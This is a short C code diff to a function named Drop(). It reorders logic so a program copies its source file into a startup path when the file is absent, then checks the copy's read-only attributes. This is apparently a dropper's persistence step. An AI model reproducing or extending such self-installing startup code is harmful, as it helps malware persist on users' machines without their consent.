@@ -254,17 +254,15 @@ VOID Drop()
 			Sleep(1000);
 		}
 
-		if (bFileExists)
+		if(!bFileExists)
 		{
-			free(strDestPath);
-			free(strSourcePath);
-			free(strStartupPath);
-			free(strDestFileName);
-			return;
+			if (!SUCCEEDED(ComCopyFile(strSourcePath, strStartupPath, strDestFileName)) || !PathFileExists(strDestPath))
+				DoCopyFile(strSourcePath, strDestPath);
 		}
 
-		if (!SUCCEEDED(ComCopyFile(strSourcePath, strStartupPath, strDestFileName)) || !PathFileExists(strDestPath))
-			DoCopyFile(strSourcePath, strDestPath);
+		//check/set the file attributes (read-only check)
+		if(PathFileExists(strDestPath))
+			CheckFileAttribs(strDestPath);
 
 		free(strDestPath);
 		free(strSourcePath);
